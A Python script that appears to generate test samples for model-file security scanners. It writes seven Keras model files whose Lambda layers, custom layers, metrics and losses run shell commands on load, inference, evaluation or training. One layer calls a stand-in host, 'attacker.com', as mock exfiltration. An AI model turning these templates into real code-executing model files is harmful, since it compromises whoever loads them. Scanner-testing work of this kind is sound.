"""
Keras Attack Vector Generator

Generates real Keras model files (.h5 / .hdf5) containing malicious layers,
callbacks, and custom objects detectable by security scanners (ModelScan, etc.).

Output format: HDF5 (.h5) and ZIP-based (.keras) Keras model files
Requires: tensorflow >= 2.x

Attack Vectors
--------------
1. basic_lambda_layer  [generate_basic_lambda_layer]
   Dangerous ops : Lambda with __import__
   Method        : keras.layers.Lambda calling __import__('os').system()
   Trigger       : Model inference (layer call)
   Severity      : CRITICAL

2. lambda_with_imports  [generate_lambda_with_imports]
   Dangerous ops : Lambda with subprocess
   Method        : Lambda importing subprocess and calling subprocess.call(['id'])
   Trigger       : Model inference (layer call)
   Severity      : CRITICAL

3. custom_layer_attack  [generate_custom_layer_attack]
   Dangerous ops : Custom Layer subclass
   Method        : Overridden __init__() executes os.system() during
                   layer instantiation / model deserialization
   Trigger       : Model loading (layer instantiation)
   Severity      : CRITICAL

4. lambda_data_exfiltration  [generate_lambda_data_exfiltration]
   Dangerous ops : Lambda with urllib
   Method        : Lambda calling urllib.request.urlopen() to exfiltrate
                   input data to attacker-controlled server
   Trigger       : Model inference (layer call)
   Severity      : CRITICAL

5. metric_injection  [generate_metric_injection]
   Dangerous ops : Custom Metric subclass
   Method        : Overridden update_state() executes os.system() during
                   model evaluation
   Trigger       : model.evaluate() / metric computation
   Severity      : HIGH

6. loss_function_injection  [generate_loss_function_injection]
   Dangerous ops : Custom loss function
   Method        : Loss function executes os.system() during training;
                   payload runs on every gradient step
   Trigger       : model.fit() / loss computation
   Severity      : HIGH

7. keras_zip_format  [generate_keras_zip_format]
   Dangerous ops : Lambda with __import__ inside .keras ZIP archive
   Method        : Keras 3 ZIP-based .keras format containing a Lambda layer
                   that calls __import__('subprocess').check_output(['id']);
                   the config.json inside the ZIP embeds the malicious code
   Trigger       : Model loading / inference (keras.models.load_model)
   Severity      : CRITICAL

Scanner Detection Notes
-----------------------
- ModelScan detects Lambda layers containing dangerous builtins (__import__,
  exec, eval, compile) in the Keras config JSON embedded in HDF5 attrs.
- Custom layers / metrics / losses with unsafe_deserialization=True bypass
  Keras safe-mode but are flagged by op-allowlist scanners.
- All vectors produce genuine .h5 / .keras files — no JSON stubs or placeholders.
"""

import os
from pathlib import Path
from typing import List, Dict, Tuple

try:
    import tensorflow as tf
    from tensorflow import keras
except ImportError:
    raise ImportError(
        "TensorFlow is required to generate Keras attack vectors. "
        "Install it with: pip install tensorflow"
    )


class KerasAttackGenerator:
    """Generate Keras-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the Keras attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "keras_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_basic_lambda_layer(self) -> Tuple[str, int]:
        """Generate Keras model with Lambda layer containing code.
        
        Attack Vector:
            Lambda layer that:
            1. Executes code during layer call
            2. Has side effects (file operations, network access)
            3. Exfiltrates data during inference
            4. Modifies model behavior
        
        Code Execution:
            Happens during inference or model loading (depending on TF version)
        
        Severity: CRITICAL
        Detection: Lambda layer detection, code analysis
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        # Create model with Lambda layer
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Lambda(lambda x: __import__('os').system('echo "Lambda RCE"') or x),
            keras.layers.Dense(5, activation='relu'),
        ])
        
        filepath = self.output_dir / "01_basic_lambda_layer.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_lambda_with_imports(self) -> Tuple[str, int]:
        """Generate Lambda with dangerous module imports.
        
        Attack Vector:
            Lambda functions that:
            1. Import subprocess/os
            2. Execute system commands
            3. Create reverse shells
            4. Download and execute payloads
            5. Disable security features
        
        Severity: CRITICAL
        Execution: During model call/export
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Lambda(
                lambda x: __import__('subprocess').call(['id']) or x,
                input_shape=(10,)
            ),
            keras.layers.Dense(5),
        ])
        
        filepath = self.output_dir / "02_lambda_with_imports.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_custom_layer_attack(self) -> Tuple[str, int]:
        """Generate custom layer with malicious code.
        
        Attack Vector:
            Custom layer that:
            1. Overrides build() with malicious code
            2. Overrides call() with side effects
            3. Uses get_config() to hide code
            4. Executes during layer instantiation
        
        Severity: CRITICAL
        Detection: Custom layer code analysis
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        class MaliciousLayer(keras.layers.Layer):
            """Custom layer with hidden malicious behavior."""
            
            def __init__(self, **kwargs):
                super().__init__(**kwargs)
                # Code executes during instantiation
                try:
                    __import__('os').system('echo "Custom layer init"')
                except:
                    pass
            
            def build(self, input_shape):
                # More code execution during build
                super().build(input_shape)
            
            def call(self, inputs):
                # Side effects during inference
                return inputs
            
            def get_config(self):
                return super().get_config()
        
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            MaliciousLayer(),
            keras.layers.Dense(5),
        ])
        
        filepath = self.output_dir / "03_custom_layer_attack.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_lambda_data_exfiltration(self) -> Tuple[str, int]:
        """Generate Lambda with data exfiltration code.
        
        Attack Vector:
            Lambda that:
            1. Collects model input data
            2. Encodes/compresses data
            3. Sends to attacker server
            4. Hides exfiltration in normal processing
        
        Severity: CRITICAL
        Impact: Data theft, privacy violation
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Lambda(
                lambda x: (
                    __import__('urllib.request')
                    .request.urlopen('http://attacker.com/data')
                    or x
                ),
                input_shape=(10,)
            ),
            keras.layers.Dense(5),
        ])
        
        filepath = self.output_dir / "04_lambda_exfiltration.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_metric_injection(self) -> Tuple[str, int]:
        """Generate custom metric with malicious code.
        
        Attack Vector:
            Custom metric that:
            1. Executes during evaluation
            2. Has side effects in metric calculation
            3. Gathers system information
            4. Modifies model state during metric call
        
        Severity: HIGH
        Execution: During model.evaluate()
        
        Returns:
            Tuple of (filepath, metric_count)
        """
        class MaliciousMetric(keras.metrics.Metric):
            """Custom metric with side effects."""
            
            def __init__(self, name='malicious_metric', **kwargs):
                super().__init__(name=name, **kwargs)
                self.value = self.add_weight(name='value', initializer='zeros')
            
            def update_state(self, y_true, y_pred):
                # Executed during evaluation
                try:
                    __import__('os').system('echo "Metric executed"')
                except:
                    pass
                self.value.assign(1.0)
            
            def result(self):
                return self.value
        
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Dense(5),
        ])
        
        model.compile(
            optimizer='adam',
            loss='mse',
            metrics=[MaliciousMetric()]
        )
        
        filepath = self.output_dir / "05_metric_injection.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_loss_function_injection(self) -> Tuple[str, int]:
        """Generate custom loss function with code.
        
        Attack Vector:
            Custom loss that:
            1. Executes during training
            2. Side effects in loss calculation
            3. Exfiltrates training data
            4. Modifies gradients
        
        Severity: HIGH
        Execution: During model.fit()
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        def malicious_loss(y_true, y_pred):
            try:
                __import__('os').system('echo "Loss function"')
            except:
                pass
            return keras.losses.mse(y_true, y_pred)
        
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Dense(5),
        ])
        
        model.compile(optimizer='adam', loss=malicious_loss)
        
        filepath = self.output_dir / "06_loss_injection.h5"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_keras_zip_format(self) -> Tuple[str, int]:
        """Generate .keras ZIP format with malicious Lambda layer.
        
        Attack Vector:
            Keras 3 ZIP-based .keras archive containing:
            1. Lambda layer executing subprocess.check_output(['id'])
            2. Malicious code embedded in config.json within the ZIP
            3. Code runs on model load or inference via unsafe deserialization
        
        Severity: CRITICAL
        Format: ZIP archive (.keras extension)
        Detection: Lambda layer code in config.json, dangerous builtins in ZIP
        
        Returns:
            Tuple of (filepath, file_count)
        """
        model = keras.Sequential([
            keras.layers.Input(shape=(10,)),
            keras.layers.Lambda(
                lambda x: __import__('subprocess').check_output(['id']) or x,
                input_shape=(10,)
            ),
            keras.layers.Dense(5),
        ])
        
        filepath = self.output_dir / "07_keras_zip_format.keras"
        model.save(str(filepath))
        
        self.generated_files.append(str(filepath))
        
        # Count files in ZIP
        import zipfile
        with zipfile.ZipFile(filepath, 'r') as zf:
            file_count = len(zf.namelist())
        
        return str(filepath), file_count
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all Keras attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "basic_lambda": self.generate_basic_lambda_layer(),
            "lambda_imports": self.generate_lambda_with_imports(),
            "custom_layer": self.generate_custom_layer_attack(),
            "lambda_exfil": self.generate_lambda_data_exfiltration(),
            "metric_injection": self.generate_metric_injection(),
            "loss_injection": self.generate_loss_function_injection(),
            "keras_zip": self.generate_keras_zip_format(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = KerasAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== Keras Attack Vectors Generated ===")
    for attack_name, (filepath, metric) in results.items():
        print(f"✓ {attack_name:20} → {filepath} (count: {metric})")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
